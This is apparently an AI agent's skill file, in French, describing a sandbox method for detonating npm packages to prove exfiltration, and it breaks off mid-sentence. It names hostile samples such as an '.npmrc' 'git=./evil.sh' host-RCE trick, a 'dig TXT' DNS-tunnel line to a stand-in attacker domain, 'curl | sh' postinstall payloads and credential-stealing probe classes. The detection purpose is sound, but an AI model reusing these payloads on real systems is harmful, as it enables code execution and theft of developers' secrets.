---
name: sandbox-detonation-npm
description: Use when detonating npm packages to prove exfiltration.
---

# Détonation npm — prouver ou innocenter par l'exécution

Le statique trie, la sandbox juge. Mais une sandbox qui ne fait que `require()`
ne juge rien : elle regarde. Cette skill décrit la seule forme de détonation qui
produit une **preuve** (quel secret sort, vers quel hôte) ou une **absence
étayée**, et les pièges qui transforment un run en faux négatif.

Tant que le banc de sondes ne mesure pas la sandbox, un « rien vu » ne vaut rien :
commencer par le banc, puis durcir.

## Règle d'or : faire relire AVANT de lancer

Tout run de plus d'une heure est relu par **deux modèles différents** (Mistral
et hy4 en second vérificateur) sur le script et le pilote exacts. Un protocole
faux coûte des heures et produit des chiffres faux. Poser des questions fermées
(BLOQUANT / NON BLOQUANT) et exiger la ligne à corriger.

**Faire tourner UN run et le soumettre avant la série.** Si le dispositif est jugé non probant
sur un run, il le sera sur trente : lancer la série d'abord, c'est payer des heures pour
répéter un défaut déjà nommé. Un run, une soumission, puis la chaîne — et n'enchainer qu'après
un accord explicite sur ce run-là.

La règle vaut **aussi pour le déploiement** : un script qui réécrit une commande forcée, une règle
d'élévation ou un fichier de clés est relu par le vérificateur qui ne l'a pas écrit **avant**
exécution, jamais après. Et si l'exécution est lancée puis arrêtée, prouver que rien n'a bougé en
relisant l'état réel (la ligne `command="…"` inchangée), pas en déclarant qu'on l'a décidé.

Faire **alterner** les deux vérificateurs sur plusieurs passes : chaque passe reçoit
l'avis de la précédente et doit dire ce qu'elle **retire** et ce qu'elle **maintient**.
C'est là que les erreurs tombent — un vérificateur a retiré sa propre explication de
cause après la critique de l'autre, et son critère de stabilité avec. Un avis de
vérificateur **localise**, il ne prouve pas : le banc tranche, et quand les deux se
quand les deux se contredisent, chercher la trace dans les fichiers plutôt qu'arbitrer entre deux textes.

**Un vérificateur peut se tromper sur tes propres pièces, et il faut le lui montrer par la
mesure, pas par l'obéissance.** Une objection qui repose sur une hypothèse fausse quant à
l'artefact — « tes canaris sont des littéraux, donc un filtre de chaînes connues passerait » —
se tranche en extrayant les valeurs réelles de plusieurs runs : si elles diffèrent toutes, les
canaris sont tirés par run et l'objection tombe. Concéder un défaut inexistant coûte autant
qu'en nier un vrai : on corrige le banc pour rien, et on perd la trace de ce qui marchait.
Chercher la part juste de l'objection (ici l'entropie réelle, 24 bits et non 128) et l'écrire
comme limite assumée, au lieu de la refuser en bloc.
Ne jamais déclarer « stable » sur quelques runs : trois runs verts ne prouvent rien.
Écrire l'arithmétique, sans l'arrondir en « presque sûr » : un défaut par run à taux `p`
survit à `N` runs avec la probabilité `(1-p)^N`. À 10 % : 3 runs laissent **72,9 %** de
chance de le manquer, 29 runs laissent 4,71 %, soit une borne basse unilatérale de
**90,19 %** à α = 0,05 et **80,71 %** après correction sur 25 sondes. À 1 %, il faut
**299** runs. Le piège classique est d'apparier la mauvaise probabilité au bon nombre
de runs : `0,99³ = 97 %` décrit un défaut à **1 %**, pas à 10 % — annoncer « 97 % en
3 runs » pour un défaut à 10 % est faux d'un facteur d'échelle et se fait démolir en
une passe. Écrire aussi ce que le nombre de runs ne prouvera jamais : la couverture
d'une sonde qui ne teste rien reste vide, répétée trente fois.
Écrire une **injection de faute déterministe** — elle tranche en un seul run.

**Quand la boucle de refus ne s'arrête plus, changer leur rôle.** Un vérificateur à qui l'on
demande « validez-vous ? » rend un refus ; le même, à qui l'on demande « écris les modifications
nécessaires, code complet, avec pour chaque étape ce qu'on doit voir si ça marche et si ça échoue »,
rend des patches applicables. Poser la question fermée sur **un** maillon à la fois, et lui
redonner ses propres mots en tête de commande : il corrige exactement ce qu'il a objecté, au lieu
d'ouvrir un nouveau front. Le juge constate, l'ingénieur corrige — ne pas demander les deux dans la
même passe. Exiger qu'il marque `# INCONNU:` **à l'endroit exact** où une information lui manque
plutôt que de la combler : une valeur inventée produit un patch plausible, faux, et déployé sans
qu'on le voie.

## Les trois couches

1. **disque** : snapshot avant/après sur des racines nommées ;
2. **système** : `strace -f` sans filtre ;
3. **applicatif** : harnais qui journalise les canaux (`require`, `fs.*`,
   `child_process.execSync`, `net.connect`, `https.request`, `processus`).

Un quatrième journal, le **faux-Internet**, enregistre chaque requête (SNI,
chemin, en-têtes, corps) : c'est lui qui porte la preuve.

## Le scénario qui déclenche (scripts/sbx-scenario3.sh)

Un pilote remplace temporairement `main`, sans toucher au code du paquet :

- écrit **12 états de victime** avec des canaris distincts (npmrc, ssh, aws, gh,
  docker, kube, git, env, gcloud, session WhatsApp, cookies, historique) ;
- **plafonne `setTimeout`/`setInterval`** à 1,5 s (un appel à 3 jours part) ;
- exécute les scripts **preinstall/install/postinstall/prepare** — `require()`
  ne les exécute jamais, c'est le vecteur n°1 ;
- exécute les **`bin`** (`--help`, `--version`) ;
- charge le vrai point d'entrée (**ESM par `await import()`**) et pilote ses
  exports avec une session factice + `connection.update`/`messages.upsert`.

La preuve se lit dans `scripts/cles_scenario3.py` : un canari dans un événement
**réseau** vers un hôte ≠ registry, ou dans une commande exécutée.

## Les treize pièges (tous mesurés)

0. **`exports` prime sur `main`** : Node l'ignore. Lister `main`/`index.js` d'abord
   fait charger un leurre bénin et rater la charge utile. Ordre = `exports` d'abord.
   Corollaire : charger **toutes** les entrées (import ET require), pas la première.
1. `npm install --ignore-scripts` : neutralise le vecteur n°1. Installer sans
   scripts sur l'hôte (réseau), puis **rejouer les scripts dans le conteneur** —
   ceux du paquet **et ceux des dépendances** (liste `_sbx_deps_scripts.json`
   construite après installation, 20 scripts max, 3 s chacun).
2. Timeout de 30 s : un `setTimeout` de 3 jours ne se déclenche jamais. Plafonner
   les globales, `require('node:timers')` **et** `timers/promises` — `setTimeout`,
   `setInterval` et `scheduler.wait` : chaque variante oubliée est un timer libre.
   Intercepter `Module._load`, pas seulement les globales.
3. Canari cherché dans `events.jsonl` : le pilote écrit lui-même les fichiers,
   donc **12 faux positifs par paquet**. Ne compter que le réseau.
4. Canari envoyé au **registry** : seul le **jeton npm** y est un usage normal
   (un script qui appelle npm relit `~/.npmrc`). Une session WhatsApp, une clé SSH
   ou des cookies envoyés au registry restent une fuite : ne jamais exempter
   l'hôte entier, exempter le seul canari du jeton. Comparer l'hôte par
   **égalité** (`registry.npmjs.org.attaquant.test` n'est pas le registry).
5. Jeton que le harnais pose lui-même (`CANARI_FACTICE`) : l'exclure.
6. `main` remplacé puis `require(P)` : le pilote **se require lui-même** et rend
   `{}`. Jamais `require(P)`.
7. Paquet `type: module` : un pilote `.js` meurt (`require is not defined`).
   Pilote en `.cjs`, cible chargée par `await import()`.
8. `execSync` à `timeout: 25000` × 4 scripts + × 8 bins : 196 s bloquants pour
   un run de 90 s. Budget global, 8 s par script, 4 s par bin.
9. « Rien vu » sans trace de progression : indistinguable de « jamais exécuté ».
   Écrire la trace dans le **répertoire que le harnais ramène** (`/work/out`),
   jamais dans le paquet : le dossier du paquet n'est pas copié après le run et
   la trace disparaît avec le conteneur (voir aussi le piège 15).
10. Le harnais porte l'URL et le corps dans `valeur`, pas dans `url`/`chemin`.
    Chercher les preuves là aussi, sinon une sonde qui atteint son hôte reste « — ».
11. Compter « toute valeur contenant un point » comme une URL **fabrique des clés**.
    Extraire les URL, parser l'hôte.
12. Un banc sans témoin propre ne mesure rien : la sonde témoin doit rester muette,
    sinon chaque « amélioration » peut être une machine à faux positifs. La placer
    **en dernier** dans la liste pour que sa vérification soit positionnelle.
    Un témoin muet ne prouve que l'absence de faux positifs — **il ne dit pas que
    le banc a tourné**. Le doubler d'un **contrôle positif**, une sonde dont on sait
    qu'elle doit toujours frapper : c'est la seule chose qui distingue « rien
    trouvé » de « rien mesuré ».
13. Énumérer `node_modules` à plat rate **tous les paquets scopés**
    (`node_modules/@scope/nom`) : la moitié de l'écosystème n'est alors jamais
    inspectée. Descendre d'un niveau dans les dossiers `@*`.
14. Une sonde qui ne parse pas rend « — » : c'est un faux négatif du **banc**, pas
    une force de la sandbox, et il pousse à « corriger » un trou qui n'existe pas.
    Deux causes vues : du JS fabriqué depuis une chaîne hôte où les guillemets
    imbriqués cassent le fichier, et une modification de sonde non revérifiée.
    Règle : garder les charges utiles **sans guillemets imbriqués** (construire les
    chaînes par concaténation ou `String.fromCharCode`, passer les chemins par
    variable), puis `node --check` sur **chaque** sonde générée avant de croire au
    banc. Une sonde doit d'abord être détectée par construction ; si elle ne l'est
    pas, suspecter la sonde avant la sandbox.
15. Un paramètre de scénario passé par **variable d'environnement** est perdu en
    silence : `sudo` réinitialise l'environnement (`VAR=x sudo -n bash script.sh`
    ne transmet rien) et le harnais lance la cible avec un environnement contrôlé.
    Symptôme : la sonde reste muette exactement comme si le paramètre valait zéro.
    Transmettre par **fichier** déposé à côté du pilote (`_sbx_offset.json`) et lu
    au démarrage, ou par `sudo -n env VAR=… bash …` pour ce qui pilote les
    processus extérieurs (docker, timeout).

16. **Une lecture n'est pas une exfiltration.** Attribuer un canari au réseau
    parce qu'il apparaît dans un événement du **harnais** (`fs.readFileSync` dont
    le détail contient le contenu lu) fabrique une preuve flatteuse et fausse :
    le fichier a été lu, rien n'est sorti. Seuls les canaux réseau
    (`http.corps`, `net.write`, DNS, URL) peuvent alimenter `canaris_reseau` ;
    tout `fs.*` alimente au plus une lecture. Corollaire qui vaut pour toute
    mesure : **avant d'annoncer qu'un matcher attrape une forme encodée,
    chercher cette forme exacte dans le journal** — si ni la chaîne nue ni sa
    forme encodée n'y sont, la « preuve » vient d'ailleurs.
17. **Un encodage n'est pas composable.** La base64 du fichier ne contient pas la
    base64 du canari qu'il renferme : chercher `b64(canari)` dans un corps qui
    encode `b64(fichier)` ne trouve rien, quel que soit l'alignement du secret.
    Il faut générer les trois alignements (0, 1, 2 octets de tête nuls) et
    chercher le **milieu stable** de chaque encodage (`enc[4:-4]`), plus les
    variantes url-safe, padding optionnel, hex et percent. Sans ça, un
    `postinstall` qui sérialise un fichier en base64 passe pour muet.

18. **Un run absent n'est pas un paquet muet.** Quand la paire de conteneurs
    tourne des heures et sert toutes les sondes, l'état dérive : le dossier de
    sortie est emporté entre deux paquets (`ERREUR ORCHESTRATEUR : ENOENT …
    /work/out/run/events.jsonl`), le journal réseau tombe à zéro ligne, et
    l'agrégateur rend « — ». Compter ces sondes comme « aucun geste » accuse le
    paquet à la place du banc — c'est le faux négatif le plus coûteux, parce
    qu'il est silencieux et qu'il pousse à « corriger » un trou inexistant.
    Règle : **l'absence de `run/entrees.jsonl` vaut `BANC INVALIDE`**, jamais
    « muette » ; vérifier avant chaque sonde que le conteneur est vivant, que le
    dossier de sortie existe, et que le journal réseau répond ; rejouer par
    **lots de six** plutôt que vingt d'un trait, en redémarrant la paire entre
    les lots. Un score lu sur un run dont une seule sonde est invalide est nul.

19. **Un échec d'écriture n'est pas un banc invalide, et l'inverse non plus.**
    Deux pannes se ressemblent et exigent l'action opposée :
    *rien produit du tout* → la sonde n'a pas eu lieu, on rejoue, on ne compte
    pas ; *rien produit, mais le sink a vu passer le canari ou l'hôte* → la
    détection a eu lieu et n'a pas pu être écrite : c'est une **DETECTION NON
    LOGGUEE**, à rejouer et **jamais** à effacer en la déclarant invalide. Un
    garde-fou qui ne fait pas cette distinction finit par blanchir de vraies
    détections. **Le `stderr` ne sert jamais de preuve** : il est écrit dans le
    répertoire du paquet, qui peut le laisser vide tout en exfiltrant — seul le
    journal du faux-Internet fait foi. Second piège, mesuré : le contrôle doit lire
    **le répertoire où
    le harnais écrit** (`runs-obs/<tag>/run/entrees.jsonl`), pas le dossier de
    travail du scénario — au mauvais chemin il crie « invalide » sur une sonde
    qui a rendu CLÉ. Règle : si le garde-fou contredit le fichier de clés, c'est
    le garde-fou qui est faux.

20. **Ne jamais rien insérer au milieu d'une commande shell multiligne.** Un
    ajout glissé entre une ligne finissant par `\` et sa continuation casse la
    commande **sans que `bash -n` le voie** : `sudo -n env VAR=… \` suivi d'autre
    chose n'exécute plus que `env`, qui imprime son environnement. Symptôme dans
    la sortie : un dump `HOME=… SUDO_COMMAND=…` et des runs à « 0 entrée » en
    série. Après toute retouche d'un script de scénario, lancer **une** sonde au
    premier plan et lire les premières lignes : un dump d'environnement signifie
    que la ligne de commande a été tronquée. Ancrer le patch sur la commande
    complète, ou la réécrire en entier.

21. **Un artefact présent n'est pas un artefact de CETTE sonde.** Le fail-closed
    ferme le mensonge par silence (rien produit) et laisse ouvert le mensonge par
    **attribution** : quand la paire de conteneurs sert toutes les sondes, un
    processus de la sonde précédente peut encore écrire dans un dossier de sortie
    recréé au même chemin, et déposer ses canaris dans la sonde courante. Le sink
    l'accepte, le verdict lit `CLÉ` — un positif **forgé**, indistinguable d'une
    vraie détection. Le contrôle « dossier inscriptible » ne protège pas : c'est
    exactement la condition dont l'orphelin a besoin, il la confirme au lieu de
    l'exclure. Règle : tout événement doit porter de quoi dire **quelle sonde** l'a
    produit (identifiant unique par sonde exigé côté sink, ou isolation stricte des
    sorties) ; sans cela, aucun `CLÉ` n'est publiable et aucun chiffre de run n'est
    citable. Toute modification du chemin de sortie du harnais se valide sur **une**
    sonde avant un lot — un chemin changé peut rendre toutes les sondes muettes.

22. **Un verdict recopié champ par champ se perd en silence.** La branche
    fail-closed calculait bien `verdict: "BANC INVALIDE"`, mais `main()` reconstruit
    chaque ligne dans un dict neuf (`{tag, hotes, execs, …}`) et **la clé `verdict`
    n'y était pas** : la branche ne s'exécutait jamais, et un run sans
    `entrees.jsonl` sortait « — ». Un calcul juste dans une fonction morte ne protège
    rien. Tester la **branche** (un dossier sans `run/entrees.jsonl` doit sortir
    `BANC INVALIDE`), pas la fonction qui la produit.
    Variante mesurée, encore plus silencieuse : le garde-fou « run interrompu » lisait un
    code de sortie et une durée **sur la ligne du registre**, qui ne porte ni l'un ni
    l'autre — la condition était donc toujours fausse, et toute sonde interrompue sortait
    `CLÉ`. Un garde dont les champs n'existent pas dans l'enregistrement qu'il inspecte est
    un garde mort. Le prouver en **injectant** le cas : écrire un `fin.json` à `rc:124` et
    exiger que le lecteur refuse, au lieu de conclure « aucun run interrompu » parce que la
    campagne n'en a pas montré.
    Second piège du même genre : **une règle réécrite après avoir vu le cas n'est pas celle
    qui était en vigueur**. Si un critère a été amendé en cours de route (ici « le rc qui
    fait foi » redéfini après avoir vu un `rc=124`), la campagne doit être rejouée sous le
    critère d'origine, ou le critère déclaré non citable — relire l'erratum ne répare pas
    les runs déjà faits.
23. **Un dossier de run périmé est lu comme une détection.** Une sonde refusée par
    une garde (`continue`) n'appelle jamais le harnais, mais son ancien
    `runs-obs/<tag>` reste en place : l'agrégateur le relit et rend `CLÉ`. Reproduit
    par `cp -r runs-obs/<ancien> runs-obs/<neuf>` → `CLÉ` avec le canari d'une autre
    sonde. Purger le dossier de sortie **avant** chaque sonde, ou exiger un
    identifiant de sonde dans les événements (piège 21).

## Fermer l'attribution : le nonce par sonde (prouvé)

Le piège 21 (artefact d'une autre sonde lu comme `CLÉ`) se ferme par un **nonce
par sonde**, et par rien d'autre :

- nonce de 128 bits tiré **côté hôte**, inscrit dans un registre à 8 colonnes
  (`registre.tsv`, colonne 3) **avant** la détonation ;
- `SBX_NONCE` exigé par `detoner-obs.sh` : sans lui, la détonation est **refusée**
  (`exit 4`), et transmis au conteneur par `-e SBX_NONCE=` ;
- posé **au point d'écriture unique** du journal (`ecrireBrut()` dans `lib/sbx/log.js`),
  pas dans les appelants : toutes les lignes le portent, `pid`, `cap_atteint` et
  `_fin` compris ;
- propagé aux processus enfants par `harness.js` (`ctx.envEnfant`), sinon leurs
  lignes sortent avec un nonce vide et sont rejetées ;
- compteur `echecs_ecriture` publié dans `_fin` : une écriture ratée laisse une trace.

Le lecteur refuse un événement dont le nonce n'est pas celui de la sonde
(`ATTRIBUTION INVALIDE`) et **refuse de conclure sans registre**
(`REFUS : registre absent — dénominateur inconnu, aucun verdict`). Sans
`sondes/attendus.json`, il rend `BANC NON RECEVABLE` avec « sans attendu » par sonde.

Les cinq tests d'acceptation, tous exécutés :

| Test | Attendu |
|---|---|
| T-H1 copier `events.jsonl` de N dans N+1 (inscrit au registre) | `ATTRIBUTION INVALIDE` + `BANC NON RECEVABLE` |
| T-H2 banc complet, redémarrage entre sondes | témoin `—`, aucun leurre hors du leurre |
| T-H3 banc complet **sans** redémarrage | témoin `ATTRIBUTION INVALIDE (FORGE DÉMONTRÉE)` ; s'il sort `—`, test non concluant |
| T-H4 deux bancs en parallèle | le 2e `rc=75`, aucune détonation |
| T-H5 `jq -r .nonce events.jsonl \| sort -u` | une seule valeur = colonne 3 du registre |

**Le témoin doit sortir `—`, jamais `CLÉ`.** Deux vérificateurs ont exigé l'inverse :
appliqué à la lettre, ce critère valide un banc contaminé.

**Le verrou bloque aussi vos propres tests.** `flock` avec `rc=75` est correct, mais une
unité `systemd-run --wait` encore `active` tient le verrou : le test suivant est refusé
en 8 ms, et son lecteur rend `REFUS : registre absent — dénominateur inconnu, aucun
verdict`. Ne pas contourner à la main : chaîner en attendant la fin **réelle** de l'unité
(`for i in $(seq 1 60); do [ "$(systemctl is-active sbx-<unite>)" != active ] && break; sleep 15; done`),
puis relancer. Un banc lancé trop tôt ne produit pas une erreur visible : il produit un
refus qu'on risque de lire comme un échec de la mesure.

## Le langage ne déplace pas l'interception

Ni Rust ni Go ne changent le **niveau** d'interception : un hôte embarqué obéit à
`spawn('sh',…,{env:{}})`, et `LD_PRELOAD` meurt avec `env -i`. Seul `seccomp` +
`SECCOMP_RET_USER_NOTIF` (hérité par `fork`/`exec`) tient. Débat complet, chiffres et
défauts propres à Go : `references/niveau-interception.md`.

## RCE sur l'hôte par un `.npmrc` du tarball

Un `.npmrc` glissé dans un paquet (`git=./evil.sh` + une dépendance `git`) s'exécute
pendant `npm install --ignore-scripts`, **sur l'hôte, avec les droits de
l'utilisateur** : `--ignore-scripts` ne couvre pas la résolution git. Correctif :

- supprimer du paquet extrait `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `.pnpmfile.cjs` ;
- passer `--userconfig` **et** `--globalconfig` sur **deux fichiers vides distincts**
  (`/dev/null` ×2 fait refuser npm : plus aucune installation, ce qu'un test
  d'installation réelle révèle) ;
- ajouter `--git=/bin/false`.

Contre-épreuve obligatoire : sans les drapeaux, la charge doit s'exécuter. Si elle ne
s'exécute pas non plus, le test ne discrimine pas et le correctif n'est pas prouvé.

## Des sondes qui ne testent pas ce qu'elles annoncent

Avant de conclure d'une sonde muette, vérifier qu'elle **peut** frapper. Cas réels :
une sonde censée tester `require.main` frappait en réalité par la fonction exportée
(le harnais appelle les exports, donc elle ne prouvait rien) ; une sonde d'encodage
était alignée à zéro, ce qui ne teste aucun décalage ; une sonde censée lire
`~/.npmrc` n'y avait pas de ligne `registry=`. Et surtout : **le simple contact de
l'hôte sink suffit pour une `CLÉ`**, donc le matcher de canaris n'est jamais
sollicité — une sonde qui n'émet aucun canari ne teste pas le matcher.

### Aucune sonde ne dépend du mécanisme ⇒ le banc est aveugle à sa panne

Un banc peut afficher le même score avec une étape **cassée** que sans elle, si
aucune sonde n'a besoin de cette étape pour frapper. Mesure réelle : vingt-quatre
sondes à 23 `CLÉ` + témoin muet, alors que l'étape qui pilote les exports n'était
jamais atteinte — les `CLÉ` venaient toutes d'un autre canal (postinstall,
chargement). Le score était juste, la question n'était pas posée.

Règles :

- pour **chaque** mécanisme du harnais (postinstall, `main` exécuté, exports pilotés,
  horloge, dépendances), exiger **au moins une sonde dont la charge ne part que si
  ce mécanisme agit** — sinon sa panne est invisible dans le total ;
- prouver la sonde dans les deux sens : elle frappe avec le nouveau harnais et reste
  muette avec l'ancien (rejouer les deux, mesurer la fenêtre d'observation et le
  nombre de requêtes, pas seulement le verdict) ;
- ne pas en conclure que les runs antérieurs étaient **faux** : ils mesuraient autre
  chose. Écrire « muets sur cette question », pas « caducs » — une sur-correction
  détruit la valeur de mesures qui, elles, tenaient.

## Le banc de sondes (scripts/fabrique_sondes.py)
Dix-neuf classes malveillantes + un témoin : postinstall, ESM, timer 3 jours, bin
seul, jeton npm, config C2, `exports` sans `main`, payload `eval`, shell+curl,
hook auto-installé, session WhatsApp, **charge utile dans `exports` derrière un
`index.js` bénin**, **postinstall d'une dépendance**, **charge qui n'agit qu'après
30 jours** (horloge), **loader gardé par `require.main === module`**, **binaire
absent au `postinstall`** (`curl | sh` : l'échec doit ressortir, pas le silence),
**charge répartie sur deux modules** (lecture dans `lib/collect.js`, envoi dans
`lib/wire.js` : aucun fichier ne porte les deux, ce qu'un statique ne peut pas
corréler), **hôte déduit de `~/.npmrc`** (aucune URL littérale dans le paquet).

**Toute sonde nouvelle exige un couple discriminant**, sinon elle ne prouve rien :
un paquet qui frappe dans la condition de contrôle *et* dans la condition testée
mesure le décor, pas le mécanisme. Cas réel : une sonde d'horloge dont la date
d'installation était « il y a 30 jours » frappait aussi sans décalage — elle
franchissait son seuil dans les deux cas. Le contrôle doit être construit pour
*échouer* si le mécanisme manque (installé il y a 1 jour, seuil 30 jours).

Note de mesure : le banc compte dix-neuf classes plus le témoin. **Aucun chiffre
agrégé n'est publiable sans avoir vérifié, sonde par sonde, qu'elle a bien produit
son `entrees.jsonl`** : trois passes complètes de suite ont rendu 17, puis 13,
puis 12 — non pas parce que le moteur bougeait, mais parce que six à sept sondes
n'avaient pas eu lieu et se lisaient « muettes » (piège 18). Ce qui se cite, c'est
le résultat des sondes mesurées individuellement, ou un run complet dont chaque
ligne est validée.

Chaque sonde ajoutée se rejoue **avec le banc entier** : deux sondes déjà vertes
sont tombées muettes après l'ajout d'une troisième, à cause d'un hook enrichi —
le score se lit sur le run complet, jamais sur le paquet isolé. Mais un run
complet peut aussi être invalide pour cause de banc : avant de conclure à une
régression, vérifier que **chaque** sonde a bien produit son `entrees.jsonl` et
que le journal réseau n'est pas vide.

## Audit en boucle (scripts/audit_sandbox_20.py)

Le protocole se durcit par **tours** : un panel de modèles relit le code exact et
rend des constats, puis le **banc est rejoué**. Le banc est le juge, le panel est
l'inspirateur : un constat n'est retenu que si le score tient et que le témoin
reste muet. Détail du panel, du format de constat et de la veille :
`references/audit-loop.md`.

## Limites assumées (à énoncer, pas à masquer)

- **Le temps n'est simulé qu'à moitié.** Plafonner les délais fait partir un
  `setTimeout` de trois jours en 1,5 s, et le décalage d'horloge (`_sbx_offset.json`)
  fait franchir un seuil « 30 jours écoulés » — vérifié par sonde, avec contrôle
  muet à 1 jour. Restent hors d'atteinte : les charges qui comptent des **tics**
  (`setInterval` × N) plutôt que du temps, les horloges des **binaires natifs**, et
  `process.uptime()`/`performance.now()` non décalés sauf patch explicite.
- **Tunnel DNS** : le faux-Internet voit SNI/HTTP, pas les requêtes UDP brutes.
  Un `dig TXT <base32>.attaquant.tld` passe sous le journal sans laisser de trace.
- **Phase d'installation** : installée hors sandbox (`--ignore-scripts`) puis
  rejouée ; l'ordre npm réel, les builds natifs et les résolutions transitives ne
  sont pas observés.
- **Canaris absents de la liste** : `ENV` et `MSG` manquaient à `CANARIS_CONNUS`,
  donc un environnement ou un message WhatsApp encodés n'étaient jamais cherchés.
  Une liste de canaris se relit contre ce que le semeur pose réellement.
- **Canari encodé** : les variantes brutes (base64 std/url-safe avec et sans
  padding, hex, percent) sont calculées, mais **aucune sonde ne les a encore
  validées** : la sonde qui encode un fichier en base64 reste muette, faute des
  trois alignements du piège 17. Ce trou ne doit pas être annoncé comme fermé
  avant qu'une sonde dédiée ne l'ait prouvé dans les deux sens.

## Concurrents et inspiration

La cartographie des dépôts qui font la même chose, ce qu'ils font mieux, ce qu'il
ne faut PAS copier, et la recette pour les lire sans brûler le quota GitHub :
`references/concurrents.md`.

## Sceller sans se mentir, et savoir s'arrêter

Un sceau **tronqué** n'est pas un sceau : publier 64 hex complets, jamais un préfixe présenté
comme un `sha256` (une empreinte de 25 caractères n'est même pas un préfixe d'octets valide).
Énoncer la règle d'exclusion avec la commande qui la vérifie — `sed '/^SCEAU=/d' fichier |
sha256sum` doit rendre la valeur annoncée — sinon le champ n'est authentifié par rien. Sceller
**tout ce qui s'exécute** : fabrique (c'est elle qui tire les canaris), orchestrateur, lecteur,
harnais, image, helper.

Un vérificateur sans accès à la machine finit toujours par exiger un ancrage externe signé
(horodatage tiers). C'est un regrès infini : chaque sceau peut être re-scellé. Poser la racine
de confiance explicitement — la machine de l'opérateur, le sceau protégeant de la **dérive** et
non d'un opérateur malveillant — puis arrêter la boucle, au lieu d'empiler des passes qui ne
concluront jamais.

**Donner aux vérificateurs un modèle de menace, au lieu de les laisser l'élargir.** Le banc se
juge contre l'**erreur**, pas contre la fraude : opérateur de bonne foi, propriétaire de la
machine et seul consommateur du résultat, agents faillibles. Ce qu'on prouve : code exécuté ≠
code relu, fichier périmé, garde morte, chiffre mal étiqueté, contamination entre sondes. Un
refus qui ne repose que sur « l'opérateur pourrait tout réécrire » est hors sujet — le renvoyer
en exigeant qu'il nomme une erreur possible et le test qui la détecte. Sur une machine où
l'administrateur du système, le root du sous-système et le titulaire du socket de conteneurs
sont la même personne, cette preuve-là est **impossible par construction** : la chercher coûte
des heures et ne produit que des refus. La seule voie réelle, si un tiers doit un jour être
convaincu : faire tourner le banc — synthétique, jamais de vrai malware — sur une
infrastructure qui n'appartient pas à l'opérateur, qui exécute le commit exact et horodate les
journaux côté serveur.

**L'ancrage externe par run est néanmoins faisable, et c'est ce qui fait avancer la validation.**
Écrire avant et après **chaque** run un manifeste (horodatage, digest de l'image, empreintes des
fichiers réellement exécutés — fabrique et orchestrateur compris), puis le **publier**. Le
constructeur de manifeste doit **échouer bruyamment** sur un fichier manquant et compter ce
qu'il a hashé : une substitution de chemin fautive (`${f/\/opt:/\/opt}`) a transformé des
entrées en chemins inexistants, le test d'existence a échoué, et le manifeste a **omis en
silence** le détoneur et le harnais — seul symptôme, un champ `image` vide. Comparer le
nombre d'empreintes au nombre attendu et refuser de publier sinon ; un manifeste incomplet
est pire qu'aucun, il atteste du code qui n'a pas tourné. Mais **pousser un commit ne date rien** : `GIT_AUTHOR_DATE`,
`GIT_COMMITTER_DATE` et `--date=` sont écrits par le client, et l'API GitHub n'expose pour un
commit que `author.date`/`committer.date` — aucun `received_at`. Séparer engagement et résultat en
deux commits ne change rien. Le seul horodatage citable est un objet créé **par le serveur** (issue
ou release via l'API), et son **corps doit porter les empreintes** : une réservation d'horodatage
nue ne relie l'heure à aucun contenu et ne discrimine pas entre « j'avais ce code » et « j'ai
choisi ce code après coup ». Même complet, il ne franchit pas le dernier saut — les empreintes
sont calculées par la machine de l'opérateur, pas par l'exécutant : seul le harnais déclarant
lui-même, au démarrage et avant de charger le paquet, les digests des fichiers qu'il charge relie
l'objet aux octets réellement exécutés. Sans cela, `registres-sceau` n'empreinte que les registres
entre eux et le vérificateur répond, à juste titre, que le code scellé n'est pas prouvé être celui
qui tournait. Procédure, code et critères RÉUSSITE/ÉCHEC : `references/ancrage-externe.md`.

**Une preuve produite par celui qui lance ne vaut pas contre lui.** C'est la conclusion où les
deux vérificateurs arrivent, et elle condamne toute une famille de solutions séduisantes :
un préchargement injecté par `NODE_OPTIONS=--require` ou par la ligne de commande du conteneur,
un événement `seq=0` émis par du code que l'opérateur a écrit, des empreintes calculées côté
hôte — tout cela est **circulaire**. Celui qui lance peut lancer sans le préchargement, avec
un autre fichier, ou avec la variable vide ; et un `seq=0` qui hashe un *chemin* via `fs` ne
prouve rien sur la *source* réellement passée à `Module.prototype._compile` (TOCTOU, cache de
require, symlinks, `NODE_PATH`, loaders ESM). Le maillon n'est franchi que si la **commande de
lancement** est écrite par root (ou un tiers) et non modifiable par l'opérateur.
Corollaire à vérifier **avant** tout le reste : le script que root exécute — une porte à
commande forcée, par exemple — ne doit pas appartenir à l'opérateur. Un `chown <user>` sur ce
script laisse root exécuter du code réécrivable à volonté, et tout ce qui est construit
derrière devient nul. Le corriger **sans root dans le sous-système est possible** : un fichier
posé par un compte d'administration, ACL coupée sur les seuls SID Administrateurs et SYSTEM, que
root exécute à travers le montage — et dont la preuve est un `Permission denied` mesuré depuis
le compte de l'opérateur, jamais la lecture de l'ACL. Recette, contraintes des distributions
(une par utilisateur Windows) et ordre de déploiement : `references/ancrage-externe.md`.

**Ne jamais réécrire le fichier de provenance après le lancement.** Une session a produit deux
sceaux successifs (`264bcda2…` puis `0edd08e6…`), le second écrit après les runs : le sceau
affiché devient **postérieur** aux exécutions et ne les couvre plus, ce que les deux vérificateurs
ont relevé immédiatement. Si le fichier doit changer, écrire dans un fichier daté distinct et
consigner la chronologie ; sinon le dossier est réputé non ancré.

Formulation qu'ils finissent par accorder quand l'ancrage manque : « déclaration de l'opérateur
sur sa propre machine, non ancrée extérieurement ». Ne pas prétendre mieux.

## Le contrôle positif doit être DANS la boucle

Des contre-épreuves jouées **avant** la campagne ne disent rien de la campagne : un détecteur
qui meurt au troisième run passe 29/29 « recevable ». Exiger à **chaque** run des sondes qui
frappent par construction, couvrant les trois canaux (io/réseau, matcher seul, registry seul),
avec canaris non vides et nonce du registre — sans quoi vingt-neuf « recevables » ne mesurent
que la régularité du silence. Corollaire sur les canaris : ils doivent être tirés par run et
inscrits au registre avant détonation ; six hex (24 bits) suffisent à ne pas collisionner mais
s'annoncent comme tels, jamais comme 128 bits.

## Ne jamais lire le lecteur pendant que le banc tourne

Un run en cours affiche `BANC INVALIDE (entrees.jsonl absent ou vide)` sur la sonde en vol,
puis la rejoue et la réussit. Lu trop tôt, cela ressemble à une régression. Attendre la
ligne `FINI` du scénario, ou la sortie du processus, avant tout verdict.

## La frontière est le conteneur, pas les droits de l'hôte

Le paquet détoné est isolé : `priv=false`, réseau dédié, aucun montage de `/`, pas de
socket docker. Une sonde qui lit `~/.ssh` ou écrit un hook `~/.claude` frappe **dans** le
conteneur, sur des canaris factices. Il n'existe qu'**une** ligne où un paquet touche
